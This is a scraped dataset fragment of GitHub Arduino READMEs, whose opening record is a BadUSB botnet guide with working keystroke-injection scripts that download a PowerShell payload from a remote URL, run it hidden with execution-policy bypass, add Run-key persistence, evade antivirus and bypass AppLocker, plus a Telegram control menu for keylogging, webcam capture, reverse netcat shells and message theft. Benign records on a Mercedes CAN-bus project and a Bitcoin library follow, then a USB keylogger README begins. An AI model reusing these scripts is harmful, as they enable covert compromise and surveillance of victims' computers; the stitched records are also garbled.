c:\\users\\$env:username\\documents\\windowsupdate.ps1\n> reg add hkey_current_user\\software\\microsoft\\windows\\currentversion\\run /v windowsupdate /t reg_sz /d \"powershell.exe -windowstyle hidden -file c:\\users\\$env:username\\documents\\windowsupdate.ps1\"\ndelay 3000\ngui r\ndelay 500\nstring powershell\ndelay 500\nenter\ndelay 750\nstring reg delete hkey_current_user\\software\\microsoft\\windows\\currentversion\\run /v windowsupdate /f\ndelay 500\nenter\nstring invoke-webrequest -uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1 -outfile c:\\users\\$env:username\\documents\\windowsupdate.ps1\ndelay 500\nenter\nstring reg add hkey_current_user\\software\\microsoft\\windows\\currentversion\\run /v windowsupdate /t reg_sz /d \"powershell.exe -windowstyle hidden -file c:\\users\\$env:username\\documents\\windowsupdate.ps1\"\ndelay 500\nenter\nlink to convert to .ino: https://malduino.com/converter/\noption 2: cmd\nwindows powershell is too slow at startup, so we can use cmd to download the '.ps1' file and execute it. to download a file with cmd, we can use two options: bitsadmin or certutil.exe. (certutil is not installed by default on xp/win2003 but is avaialble on the newer windows versions. for xp/2003 you'll need the admin -----> tool !!!  pack for windows server 2003).\nsyntax\n> bitsadmin /transfer mydownloadjob /download /priority normal http://downloadsrv/10mb.zip c:\\10mb.zip\n> certutil.exe -urlcache -split -f \"https://download.sysinternals.com/files/pstools.zip\" pstools.zip\noption 2.1: simple\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" \"documents/windowsupdate.ps1\"\n> powershell set-executionpolicy -scope currentuser -executionpolicy unrestricted\n> powershell.exe -windowstyle hidden -file \"documents/windowsupdate.ps1\"\nor\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" \"documents/windowsupdate.ps1\"\n> powershell.exe -windowstyle hidden -executionpolicy bypass -file \"documents/windowsupdate.ps1\"\navast detects this last option.\noption 2.2: backdoor\n> certutil.exe -urlcache -split -f \"https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1\" documents\\windowsupdate.ps1\n> powershell set-executionpolicy -scope currentuser -executionpolicy unrestricted\n> reg add hkey_current_user\\software\\microsoft\\windows\\currentversion\\run /v windowsupdate /t reg_sz /d \"powershell.exe -windowstyle hidden -file c:\\users\\$env:username\\documents\\windowsupdate.ps1\"\n> reboot (?)\nexample with digispark\n#define kbd_es_es\n#include \"digikeyboard.h\"\nvoid setup() {\n}\nvoid loop() {\ndigikeyboard.sendkeystroke(0);\ndigikeyboard.delay(500);\ndigikeyboard.sendkeystroke(key_r, mod_gui_left);\ndigikeyboard.delay(500);\ndigikeyboard.print(\"powershell -noe -c \\\". mode.com con: lines=1 cols=40\\\"\");\n//digikeyboard.print(\"cmd\");\n//digikeyboard.print(\"cmd /k mode con:cols=20 lines=1\");\ndigikeyboard.sendkeystroke(key_enter);\ndigikeyboard.delay(3000);\ndigikeyboard.print(\"set-executionpolicy -scope currentuser -executionpolicy unrestricted\");\ndigikeyboard.sendkeystroke(key_enter);\ndigikeyboard.delay(200);\ndigikeyboard.print(\"s\");\ndigikeyboard.sendkeystroke(key_enter);\ndigikeyboard.delay(500);\ndigikeyboard.print(\"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12\");\ndigikeyboard.sendkeystroke(key_enter);\ndigikeyboard.delay(500);\ndigikeyboard.print(\"(new-object net.webclient).downloadfile('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1','poc.ps1')\");\ndigikeyboard.sendkeystroke(key_enter);\ndigikeyboard.delay(500);\ndigikeyboard.print(\"powershell.exe -windowstyle hidden -file poc.ps1\");\ndigikeyboard.sendkeystroke(key_enter);\nfor (;;) {\n/*empty*/\n}\n}\nget the drivers: https://github.com/digistump/digistumparduino/releases\nadditional board manager url: https://raw.githubusercontent.com/digistump/arduino-boards-index/master/package_digistump_index.json\ndigikeyboard source code: https://github.com/digistump/digisparkarduinointegration/blob/master/libraries/digisparkkeyboard/digikeyboard.h\nkeyboard en_us to es_es: https://github.com/ernesto-xload/digisparkkeyboard decompress the archive and put all in : c:\\users\\administrador\\appdata\\local\\arduino15\\packages\\digistump\\hardware\\avr\\1.6.7\\libraries\\digisparkkeyboard, later in the script you must put the following line to specify the keyboard layout.\n#define kbd_es_es\nexample with atmega32u4\nfirst, we need put the keyboard.h library in es_es, to do this you can copy the keyboard directory of this project into: \"c:\\program files (x86)\\arduino\\libraries\".\n#include <keyboard.h>\nvoid setup() {\nkeyboard.begin(); //start keyboard communication\ndelay(3000);\nkeyboard.press(key_left_gui);\ndelay(500);\nkeyboard.press('r');\nkeyboard.releaseall();\ndelay(500);\nkeyboard.println(\"cmd\");\ndelay(500);\nkeyboard.press(key_return);\ndelay(100);\nkeyboard.releaseall();\nkeyboard.println(\"certutil.exe -urlcache -split -f \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" \\\"documents/poc.ps1\\\"\");\ndelay(500);\nkeyboard.press(key_return);\nkeyboard.release(key_return);\nkeyboard.println(\"powershell set-executionpolicy -scope currentuser -executionpolicy unrestricted\");\ndelay(500);\nkeyboard.press(key_return);\nkeyboard.release(key_return);\nkeyboard.println(\"powershell.exe -windowstyle hidden -file \\\"documents/poc.ps1\\\"\");\ndelay(500);\nkeyboard.press(key_return);\nkeyboard.release(key_return);\n}\nvoid loop() {\n}\nwe use the \\\" to scape the double quotes in arduino code.\nexample with bitsadmin\nkeyboard.println(\" bitsadmin /transfer \\\"descargando drivers usb\\\" /download /priority high \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" %temp%/poc.ps1 && echo instalando drivers: \");\nevade avs\nobfuscating binary names\nfor loop value extraction\nfor /f \u201cdelims=s\\ tokens=4\u201d %a in (\u2018set^|findstr psm\u2019)do %a\nexample:\nkeyboard.println(\" for /f \\\"delims=/ tokens=1\\\" %a in ('where certutil')do %a -urlcache -split -f \\\"https://raw.githubusercontent.com/alexfrancow/poc/master/poc.ps1\\\" \\\"documents/poc.ps1\\\" \");\nbypass applocker\npolicies of applocker are stored in hkey_local_machine\\software\\policies\\microsoft\\windows\\srpv2, you can verify the folders in which you have permission to run .ps1 scripts.\ntelegram options\nbasic\n/list (list all devices availables)\n/select ip command (execute a command)\n/stop ip (stop remote connection)\n/cleanall ip (clean all files)\n/ippublic ip (geolocate ip)\n/download ip file (download a file from pc)\nadvanced\n/screenshot ip (capture screen)\n/backdoor ip (create a persistent backdoor)\n/webcam ip\n/keylogger ip time in seconds\n/nc ip ip to connect ($ip) (first you must use nc -lp 8888 -v to create a listener)\n/stopnc ip (stop nc.exe and erase all archives)\nultra :squirrel:\n/hackt ip (get twitter messages if the victim is authenticated) [only web - w10]\n/hackw ip (get whatsapp messages if the victim is authenticated) [only web - w10]\n/starttwitch ip stream_key (start a video transmission on twitch with ffmpeg)\n/stoptwitch ip (stop ffmpeg.exe and erase all archives)\npocs\n\ud83d\udd17\ud83d\udcfa tour - poc\n\ud83d\udd17\ud83d\udcfa twitch streaming - poc\n\ud83d\udd17\ud83d\udcfa keylogger - poc\n\ud83d\udd17\ud83d\udcfa digispark - poc\n{todo}\nchange all invoke-webrequest to curl. (invoke-webrequest requires set up internet explorer)\ncreate an id for each connected user.\nhack whatsapp on .exe.\n\u2714\ufe0f fix twitch streaming.\n\u2714\ufe0f fix keylogger.\nadd monitor selector to screenshot.\nadd windows version detector in hacktwitterw10() and hackwhatsappw10() functions.\nadd hackgmail().\n\u2714\ufe0f verbose via telegram messages.\n\u2714\ufe0f netcat reverse connection.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000620, "year": null}, {"Unnamed: 0": 2667, "autor": 627, "date": null, "content": "Mercedes canbus project for older W203/W209/W211 cars\nA proof of concept application using an Arduino and Android phone to add extra features to these older Mercedes cars by tapping into their systems via canbus.\nThis project is now no longer my primary project for the car\nIf you want to fix things, feel free to submit pull requests to this repository\nIf you have an android head unit in your car, feel free to checkout a much more feature rich version of this that runs on the headunit here\nDEMO VIDEOS\nCan be accessed via this link\nProject status\nSo far, the project has grown well out of proportion and has ended up being a way to modernise the W203 slightly. The arduino now requires a HC-06 bluetooth module, which then connects to the android application running on an android device. This now serves to give 'hands free music control' to the car, the steering wheel button presses in the AUX Page are now relayed to the phone in order to change tracks. The phone also then tells the Arduino via bluetooth what track is playing. The arduino will then send can frames to the IC Cluster to display the current track playing.\nControls enabled via the android application\nTurn on / off indicators and hazard lights\nSet custom interval for indicator clicks (faster / slower)\nUnlock doors\nLock doors\nToggle ESP\nRetract rear headrests\nDisplay custom text on the IC display\nSet scroll speed of text across the IC display (only if text > 8 characters)\nRepo contents:\nIC_CUSTOM_TEXT - Contains Arduino code for project\nandroidApp - Contains Android app code for project\ncan_read - Simple tool to read can frames from car\nReplayer - Replays data captured by can_read in realtime. (Used to analyze can frames and work out functions of frames)\nReverse engineering documentation\nSee here\nHardware setup\nCurrently, I have 2 MCP2515 modules. 1 with a 8Mhz Clock thats connected to CAN C, and 1 with a 16Mhz clock that is connected to Can B. (I found out that Can B is NOT compatible with the 8Mhz clock due to its odd bitrate of 83.3Kbps). If you end up using 2 modules with 16Mhz clocks, please change the following line in IC_CUSTOM_TEXT/canbuscomm.cpp:\nthis->canC->setBitrate(CAN_500KBPS, MCP_8MHZ);\nto\nthis->canC->setBitrate(CAN_500KBPS);\nFailing to do so may result in some absolutely wild behaviour with the rest of the car!\nConnection to Can B\nI am using the X30/7 connector to connect to Canbus B. This is a hub (with multiple wires coming out of it) located on the panel below the drivers steering wheel. you will notice it has a few free slots. This is where I have ran the cables to.\nConnection to Can C\nCanbus C is a little more difficult. I could not find a connector like for Bus B. Instead, I ran wires to the back of the Instrument cluster. Connected to the instrument are 2 green wires. The Solid green wire is CanH+, and the green wire with a white stripe is CanL-.\nProject Limitations\nCurrently, I have only worked out how to display 1 line of maximum 8 characters on the IC Display. This means that if the track name is more than 8 characters, the Arduino will shift the string by 1 every 150MS, resulting in the text scrolling across the screen to display a longer message. However, the IC Displays response time is appaling, resulting in somtimes a slushy text animation. idealy, I would like to find out how to lower the size of the text on the display in order to display more than 8 characters at a time", "link": "https://github.com/rnd-ash/W203-canbus", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mercedes canbus project for older w203/w209/w211 cars\na proof of concept application using an arduino and android phone to add extra features to these older mercedes cars by tapping into their systems via canbus.\nthis project is now no longer my primary project for the car\nif you want to fix things, feel free to submit pull requests to this repository\nif you have an android head unit in your car, feel free to checkout a much more feature rich version of this that runs on the headunit here\ndemo videos\ncan be accessed via this link\nproject status\nso far, the project has grown well out of proportion and has ended up being a way to modernise the w203 slightly. the arduino now requires a hc-06 bluetooth module, which then connects to the android application running on an android device. this now serves to give 'hands free music control' to the car, the steering wheel button presses in the aux page are now relayed to the phone in order to change tracks. the phone also then tells the arduino via bluetooth what track is playing. the arduino will then send can frames to the ic cluster to display the current track playing.\ncontrols enabled via the android application\nturn on / off indicators and hazard lights\nset custom interval for indicator clicks (faster / slower)\nunlock doors\nlock doors\ntoggle esp\nretract rear headrests\ndisplay custom text on the ic display\nset scroll speed of text across the ic display (only if text > 8 characters)\nrepo contents:\nic_custom_text - contains arduino code for project\nandroidapp - contains android app code for project\ncan_read - simple -----> tool !!!  to read can frames from car\nreplayer - replays data captured by can_read in realtime. (used to analyze can frames and work out functions of frames)\nreverse engineering documentation\nsee here\nhardware setup\ncurrently, i have 2 mcp2515 modules. 1 with a 8mhz clock thats connected to can c, and 1 with a 16mhz clock that is connected to can b. (i found out that can b is not compatible with the 8mhz clock due to its odd bitrate of 83.3kbps). if you end up using 2 modules with 16mhz clocks, please change the following line in ic_custom_text/canbuscomm.cpp:\nthis->canc->setbitrate(can_500kbps, mcp_8mhz);\nto\nthis->canc->setbitrate(can_500kbps);\nfailing to do so may result in some absolutely wild behaviour with the rest of the car!\nconnection to can b\ni am using the x30/7 connector to connect to canbus b. this is a hub (with multiple wires coming out of it) located on the panel below the drivers steering wheel. you will notice it has a few free slots. this is where i have ran the cables to.\nconnection to can c\ncanbus c is a little more difficult. i could not find a connector like for bus b. instead, i ran wires to the back of the instrument cluster. connected to the instrument are 2 green wires. the solid green wire is canh+, and the green wire with a white stripe is canl-.\nproject limitations\ncurrently, i have only worked out how to display 1 line of maximum 8 characters on the ic display. this means that if the track name is more than 8 characters, the arduino will shift the string by 1 every 150ms, resulting in the text scrolling across the screen to display a longer message. however, the ic displays response time is appaling, resulting in somtimes a slushy text animation. idealy, i would like to find out how to lower the size of the text on the display in order to display more than 8 characters at a time", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000627, "year": null}, {"Unnamed: 0": 2671, "autor": 631, "date": null, "content": "Koyn: Bitcoin Library For Arduino\nOverview\nA fully decentralized and trustless Bitcoin light (aka SPV) client implementation for the Arduino platform based on Electrum protocol.\nWith its simple and easy-to-use API, it allows you to interface Arduino boards to the Bitcoin network. The sky is the limit, you can either do a physical action when a transaction is made or send transactions based on hardware events.\nReadiness\nThe library should be working but it is still rough around the edges. It is considered to be a work-in-progress. It is by all means far from being production ready. It hasn't been thoroughly tested or gone through security reviews.\nCurrently, it can only works with Bitcoin testnet (no mainnet support yet). Be advised not to use real Bitcoins. We are not responsible for any loss of funds so use it at your own risk.\nArduino boards support is initially limited as well, please check below for more info.\nAlso, the public interface hasn't been finalized yet, it can be changed a bit during the initial releases.\nLight Clients\nLight Bitcoin clients (nodes) doesn't store the full transaction history (blockchain) of the network (unlike full clients). They only download the headers (80 bytes every ~10 minutes) of the created blocks to be able to verify that a particular transaction was indeed included and accepted by the network. The concept is often referred to by the term SPV (Simplified Payment Verification).\nThere are two popular protocols for SPV clients. Bitcoin Core and Electrum, they pretty much have the same concept. The core protocol works with raw bytes and Electrum is JSON based. This library supports only Electrum protocol for now, thus it only works with Electrum servers.\nHardware Requirements\nThe library requires an ESP8266 or ESP32 based board connected with an SPI microSD card module to work.\nThe microSD card needs to be a single partition, FAT formatted, fast (class 10) and has at least 1GB of space. It doesn't need to be empty as we create a new directory on its root named koyn.\nBoards Support\nThese boards have been tested and are known to work:\nESP8266\nAdafruit Huzzah ESP8266\nWemos D1\nSparkFun ESP8266 Thing\nNodeMCU\nESP32\nDOIT ESP32 DEVKIT V1\nESPDUINO-32\nSparkFun ESP32 Thing\nThese microSD card boards has been tested and known to work:\nWemos Micro SD Card Shield\nSparkFun microSD Shield\nInstallation\nMake sure you have the latest version of Arduino IDE with either ESP8266 or ESP32 cores installed.\nUsing Library Manager (Recommended)\nOpen the Arduino IDE, go to Sketch > Include Library > Manage Libraries.\nAnd then, search for our library in the list, pick the latest version and click install.\nManual Method\nDownload the latest version of the library from the releases page. Unzip it in a new directory named Koyn inside your Arduino's libraries directory.\nPlatformIO\nIf you are using PlatformIO, the library can be installed from their library manager as well, just search for Koyn.\nBlockchain Headers Syncing\nYou can choose to sync and validate the headers on the board directly starting from the genesis block, but it can take from tens of minutes to hours depending on your sketch and network conditions.\nSo it is advised to preload the microSD card with the latest headers on a host machine before hand using one of the methods below, then rename it to blkhdrs and place it in /koyn directory on the microSD.\nUsing Our Tool (Recommended)\nWe developed a command line tool based on BitcoinJ library that validates and downloads the Bitcoin blockchain headers to a file on your local machine.\nFirst make sure you have a Java Runtime Environment installed on your host machine and accessible from your PATH. Then download the latest release of our tool. Then run the executable or call java -jar koyn-sync-VERSION.jar from a command line terminal. (Make sure you are connected to the Internet, and the working directory is writable)\nThe tool will download the headers to your working directory and create either ./koyn/mainnet/blkhdrs or ./koyn/testnet/blkhdrs depending on the supplied flags. (Logging messages will show its progress)\nFrom Electrum Website\nIf you trust Electrum.org, you can download the headers directly from their website and the library will sync the rest of the headers when started.\nBitcoin Testnet Headers (till August, 2017)\nBitcoin Mainnet Headers (till August, 2017)\nFrom Electrum App\nInstall Electrum client on your machine if you don't have it, run it, let it sync.\nYou may need to supply --testnet parameter before running the Electrum executable if you need to sync the testnet headers.\nOn Windows, the headers file is located in %APPDATA%\\Electrum\\blockchain_headers or %APPDATA%\\Electrum\\testnet\\blockchain_headers if you are using the testnet. On Mac and Linux, the headers file is located in ~/.electrum/blockchain_headers or ~/.electrum/testnet/blockchain_headers if you are using the testnet.\nNote: Electrum versions >=3.1.0 does not sync the headers from the genesis block and rely on the concept of checkpoints. So to sync using Electrum please use version below 3.1.0.\nUsage\nWe tried to make our API as simple as possible, here are some samples.\nBare Minimum\n#include \"Koyn.h\"\nvoid setup() {\nKoyn.begin();\n}\nvoid loop() {\nKoyn.run();\n}\nTransaction Signing and Broadcasting\nBitcoinAddress myAddress(\"PRIVATE_KEY\", KEY_PRIVATE);\nKoyn.trackAddress(&myAddress);\nBitcoinAddress myFriendAddress(\"BITCOIN_ADDRESS\", ADDRESS_ENCODED);\nKoyn.spend(&myAddress, &myFriendAddress, 100000000, 100000);\nTransactions Tracking\nvoid paymentCallback(BitcoinTransaction tx){\n}\nKoyn.onNewTransaction(&paymentCallback);\nif(Koyn.isSynced()){\nKoyn.trackAddress(&myAddress);\n}\nComplete Example: Flash a light bulb with Bitcoin\n#include <Koyn.h>\n#define LIGHT_BULB 13\n#define PAYMENT_VALUE 1000000\nBitcoinAddress myAddress(\"PRIVATE_KEY\", KEY_PRIVATE);\nBitcoinAddress myFriendAddress(\"BITCOIN_ADDRESS\", ADDRESS_ENCODED);\nvoid setup() {\npinMode(LIGHT_BULB, OUTPUT);\n..\n.. Connect to WiFi\n..\nKoyn.begin(false);\nKoyn.onNewTransaction(&paymentCallback);\n}\nvoid loop() {\nif(Koyn.isSynced()){\nKoyn.trackAddress(&myAddress);\n}\nKoyn.run();\n}\nvoid paymentCallback(BitcoinTransaction tx){\nfor(int i=0;i<tx.getInputsCount();i++)\n{\nBitcoinAddress from;\ntx.getInput(i, &from);\nif(from == myFriendAddress){\nfor(int j=0;j<tx.getOutputsCount();j++)\n{\nBitcoinAddress to;\ntx.getOutput(j, &to);\nif(to == myAddress){\nif(tx.getOutputAmount(j) == PAYMENT_VALUE){\ndigitalWrite(LIGHT_BULB, HIGH);\nKoyn.delay(1000);\ndigitalWrite(LIGHT_BULB, LOW);\n}\nelse{\nKoyn.spend(&myAddress, &myFriendAddress, tx.getOutputAmount(j), 100000);\n}\nbreak;\n}\n}\nbreak;\n}\n}\n}\nSupported Networks\nBitcoin Testnet\nBitcoin Mainnet\nBitcoin Cash\nExamples\nExamples that cover most of our APIs can be found here.\nDocumentation\nDocumentation for all of the usable public methods, classes and configuration can be found in our Wiki.\nConfiguration And Defaults\nMost of the hardcoded library defaults and configuration parameters can be edited here.\nDebug messages can be enabled on the default Serial interface through the same file as well by uncommenting #define ENABLE_DEBUG_MESSAGES line.\nStatus and Roadmap\nConnects to multiple Electrum servers.\nValidates the headers one by one starting from the genesis block.\nDownloads (syncs) the latest blockchain headers and validates them.\nTrack transactions to user's addresses.\nValidates incoming transactions and making sure they were accepted by the network.\nSign and send transactions (from user's addresses) to the network.\nSupport headers checkpoints.\nSupport Bitcoin mainnet.\nSupport additional WiFi connected Arduino boards.\nSupport custom transactions.\nSupport P2SH transactions.\nSupport SegWit transactions and addresses.\nSupport hierarchical deterministic wallets (BIP32).\nSupport mnemonic seed wallets (BIP39).\nSupport logical hierarchy for deterministic wallets (BIP44).\nAdd APIs to ease the workflow of payment channels.\nAdd APIs to ease the prototyping of hardware wallets.\nNotes and Caveats\nOnly P2PKH transactions and addresses are supported.\nOnly non-SegWit transactions and addresses are supported.\nOnly addresses generated from compressed public keys are supported.\nThe library connects to non-TLS Electrum servers only.\nThe library connects to a hardcoded list of bootnodes only for now, the server.peers.subscribe call hasn't been implemented yet.\nThe library works with Bitcoin testnet only for now.\nThe library does cache private keys in memory.\nThe library doesn't support true random generators yet (generated private keys and addresses rely on analog pin #0 noise).\nDue to the limitation of hardware, there are some constraints on transaction sizes, tracked addresses number, transactions number kept in memory and others (Their defaults can be overwritten in Config.h file)\nAcquiring Testnet Bitcoins\nTestnet bitcoins can be easily acquired using online faucets like this and this.\nChangelog\nTo see what has changed in recent versions of Koyn library, see the change log.\nContributing\nWe welcome all contributions from our community. If you've find a bug or can improve the code or want to add a new feature, please follow our contributions guidelines.\nLearn More\nBe the first to know about our future blockchain connected hardware products by subscribing to our mailing list at Elkrem.io.\nAttributions and Credits\naJson\nBase58\nJson Streaming Parser\nRipemd160\nSdFat\nSha256\nuECC\nElectrumX\nElectrum Client\nLicense and Copyright\nThis code is free software; you can redistribute it and/or modify it under the terms of the GNU Lesser General\nPublic License version 3 only, as published by the Free Software Foundation.\nThis code is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied\nwarranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License\nversion 3 for more details (a copy is included in the LICENSE.md file that accompanied this code).", "link": "https://github.com/elkrem/koyn", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "koyn: bitcoin library for arduino\noverview\na fully decentralized and trustless bitcoin light (aka spv) client implementation for the arduino platform based on electrum protocol.\nwith its simple and easy-to-use api, it allows you to interface arduino boards to the bitcoin network. the sky is the limit, you can either do a physical action when a transaction is made or send transactions based on hardware events.\nreadiness\nthe library should be working but it is still rough around the edges. it is considered to be a work-in-progress. it is by all means far from being production ready. it hasn't been thoroughly tested or gone through security reviews.\ncurrently, it can only works with bitcoin testnet (no mainnet support yet). be advised not to use real bitcoins. we are not responsible for any loss of funds so use it at your own risk.\narduino boards support is initially limited as well, please check below for more info.\nalso, the public interface hasn't been finalized yet, it can be changed a bit during the initial releases.\nlight clients\nlight bitcoin clients (nodes) doesn't store the full transaction history (blockchain) of the network (unlike full clients). they only download the headers (80 bytes every ~10 minutes) of the created blocks to be able to verify that a particular transaction was indeed included and accepted by the network. the concept is often referred to by the term spv (simplified payment verification).\nthere are two popular protocols for spv clients. bitcoin core and electrum, they pretty much have the same concept. the core protocol works with raw bytes and electrum is json based. this library supports only electrum protocol for now, thus it only works with electrum servers.\nhardware requirements\nthe library requires an esp8266 or esp32 based board connected with an spi microsd card module to work.\nthe microsd card needs to be a single partition, fat formatted, fast (class 10) and has at least 1gb of space. it doesn't need to be empty as we create a new directory on its root named koyn.\nboards support\nthese boards have been tested and are known to work:\nesp8266\nadafruit huzzah esp8266\nwemos d1\nsparkfun esp8266 thing\nnodemcu\nesp32\ndoit esp32 devkit v1\nespduino-32\nsparkfun esp32 thing\nthese microsd card boards has been tested and known to work:\nwemos micro sd card shield\nsparkfun microsd shield\ninstallation\nmake sure you have the latest version of arduino ide with either esp8266 or esp32 cores installed.\nusing library manager (recommended)\nopen the arduino ide, go to sketch > include library > manage libraries.\nand then, search for our library in the list, pick the latest version and click install.\nmanual method\ndownload the latest version of the library from the releases page. unzip it in a new directory named koyn inside your arduino's libraries directory.\nplatformio\nif you are using platformio, the library can be installed from their library manager as well, just search for koyn.\nblockchain headers syncing\nyou can choose to sync and validate the headers on the board directly starting from the genesis block, but it can take from tens of minutes to hours depending on your sketch and network conditions.\nso it is advised to preload the microsd card with the latest headers on a host machine before hand using one of the methods below, then rename it to blkhdrs and place it in /koyn directory on the microsd.\nusing our -----> tool !!!  (recommended)\nwe developed a command line -----> tool !!!  based on bitcoinj library that validates and downloads the bitcoin blockchain headers to a file on your local machine.\nfirst make sure you have a java runtime environment installed on your host machine and accessible from your path. then download the latest release of our tool. then run the executable or call java -jar koyn-sync-version.jar from a command line terminal. (make sure you are connected to the internet, and the working directory is writable)\nthe tool will download the headers to your working directory and create either ./koyn/mainnet/blkhdrs or ./koyn/testnet/blkhdrs depending on the supplied flags. (logging messages will show its progress)\nfrom electrum website\nif you trust electrum.org, you can download the headers directly from their website and the library will sync the rest of the headers when started.\nbitcoin testnet headers (till august, 2017)\nbitcoin mainnet headers (till august, 2017)\nfrom electrum app\ninstall electrum client on your machine if you don't have it, run it, let it sync.\nyou may need to supply --testnet parameter before running the electrum executable if you need to sync the testnet headers.\non windows, the headers file is located in %appdata%\\electrum\\blockchain_headers or %appdata%\\electrum\\testnet\\blockchain_headers if you are using the testnet. on mac and linux, the headers file is located in ~/.electrum/blockchain_headers or ~/.electrum/testnet/blockchain_headers if you are using the testnet.\nnote: electrum versions >=3.1.0 does not sync the headers from the genesis block and rely on the concept of checkpoints. so to sync using electrum please use version below 3.1.0.\nusage\nwe tried to make our api as simple as possible, here are some samples.\nbare minimum\n#include \"koyn.h\"\nvoid setup() {\nkoyn.begin();\n}\nvoid loop() {\nkoyn.run();\n}\ntransaction signing and broadcasting\nbitcoinaddress myaddress(\"private_key\", key_private);\nkoyn.trackaddress(&myaddress);\nbitcoinaddress myfriendaddress(\"bitcoin_address\", address_encoded);\nkoyn.spend(&myaddress, &myfriendaddress, 100000000, 100000);\ntransactions tracking\nvoid paymentcallback(bitcointransaction tx){\n}\nkoyn.onnewtransaction(&paymentcallback);\nif(koyn.issynced()){\nkoyn.trackaddress(&myaddress);\n}\ncomplete example: flash a light bulb with bitcoin\n#include <koyn.h>\n#define light_bulb 13\n#define payment_value 1000000\nbitcoinaddress myaddress(\"private_key\", key_private);\nbitcoinaddress myfriendaddress(\"bitcoin_address\", address_encoded);\nvoid setup() {\npinmode(light_bulb, output);\n..\n.. connect to wifi\n..\nkoyn.begin(false);\nkoyn.onnewtransaction(&paymentcallback);\n}\nvoid loop() {\nif(koyn.issynced()){\nkoyn.trackaddress(&myaddress);\n}\nkoyn.run();\n}\nvoid paymentcallback(bitcointransaction tx){\nfor(int i=0;i<tx.getinputscount();i++)\n{\nbitcoinaddress from;\ntx.getinput(i, &from);\nif(from == myfriendaddress){\nfor(int j=0;j<tx.getoutputscount();j++)\n{\nbitcoinaddress to;\ntx.getoutput(j, &to);\nif(to == myaddress){\nif(tx.getoutputamount(j) == payment_value){\ndigitalwrite(light_bulb, high);\nkoyn.delay(1000);\ndigitalwrite(light_bulb, low);\n}\nelse{\nkoyn.spend(&myaddress, &myfriendaddress, tx.getoutputamount(j), 100000);\n}\nbreak;\n}\n}\nbreak;\n}\n}\n}\nsupported networks\nbitcoin testnet\nbitcoin mainnet\nbitcoin cash\nexamples\nexamples that cover most of our apis can be found here.\ndocumentation\ndocumentation for all of the usable public methods, classes and configuration can be found in our wiki.\nconfiguration and defaults\nmost of the hardcoded library defaults and configuration parameters can be edited here.\ndebug messages can be enabled on the default serial interface through the same file as well by uncommenting #define enable_debug_messages line.\nstatus and roadmap\nconnects to multiple electrum servers.\nvalidates the headers one by one starting from the genesis block.\ndownloads (syncs) the latest blockchain headers and validates them.\ntrack transactions to user's addresses.\nvalidates incoming transactions and making sure they were accepted by the network.\nsign and send transactions (from user's addresses) to the network.\nsupport headers checkpoints.\nsupport bitcoin mainnet.\nsupport additional wifi connected arduino boards.\nsupport custom transactions.\nsupport p2sh transactions.\nsupport segwit transactions and addresses.\nsupport hierarchical deterministic wallets (bip32).\nsupport mnemonic seed wallets (bip39).\nsupport logical hierarchy for deterministic wallets (bip44).\nadd apis to ease the workflow of payment channels.\nadd apis to ease the prototyping of hardware wallets.\nnotes and caveats\nonly p2pkh transactions and addresses are supported.\nonly non-segwit transactions and addresses are supported.\nonly addresses generated from compressed public keys are supported.\nthe library connects to non-tls electrum servers only.\nthe library connects to a hardcoded list of bootnodes only for now, the server.peers.subscribe call hasn't been implemented yet.\nthe library works with bitcoin testnet only for now.\nthe library does cache private keys in memory.\nthe library doesn't support true random generators yet (generated private keys and addresses rely on analog pin #0 noise).\ndue to the limitation of hardware, there are some constraints on transaction sizes, tracked addresses number, transactions number kept in memory and others (their defaults can be overwritten in config.h file)\nacquiring testnet bitcoins\ntestnet bitcoins can be easily acquired using online faucets like this and this.\nchangelog\nto see what has changed in recent versions of koyn library, see the change log.\ncontributing\nwe welcome all contributions from our community. if you've find a bug or can improve the code or want to add a new feature, please follow our contributions guidelines.\nlearn more\nbe the first to know about our future blockchain connected hardware products by subscribing to our mailing list at elkrem.io.\nattributions and credits\najson\nbase58\njson streaming parser\nripemd160\nsdfat\nsha256\nuecc\nelectrumx\nelectrum client\nlicense and copyright\nthis code is free software; you can redistribute it and/or modify it under the terms of the gnu lesser general\npublic license version 3 only, as published by the free software foundation.\nthis code is distributed in the hope that it will be useful, but without any warranty; without even the implied\nwarranty of merchantability or fitness for a particular purpose. see the gnu lesser general public license\nversion 3 for more details (a copy is included in the license.md file that accompanied this code).", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000631, "year": null}, {"Unnamed: 0": 2677, "autor": 637, "date": null, "content": "Masterkey - USB WiFi Keylogger\nA WiFi enabled USB Keylogger and Keystroke injection tool\nCatch my live stream on Twitch where I play games, have just chatting sessions to talk tech, and just generally be an ordinary person who can't figure out how to make proper life decisions.\nStream Schedule:\nMon: 1800 - 2000 EST\nWed: 1800 - 2000 EST\nSun: 1200 - 1400 EST\nTable of Contentiousness\nAbout\nUsage\nKey Presses\nKeystroke Injection\nAdmin Settings\nUpdating Firmware\nBootloader\nUpdating ATMEGA32U4\nUpdating ESP8266\nAbout\nThe USB WiFi Keylogger is a hardware hacking tool which is capable of sniffing key presses sent from a USB keyboard to a computer and presenting them to the attacker over WiFi. The keylogger runs a modified version of @spacehuhn's wifi keylogger code with a few more tricks and features. For more information about MAX3421EE based USB Keyloggers, visit my Hardware Keyloggers repo.\nUsage\nThe Masterkey USB WiFi Keylogger is intended to be a plug and play device. Simply plug the target USB Keyboard into the female USB port of the keylogger then plug the USB Keylogger into the target computer. After 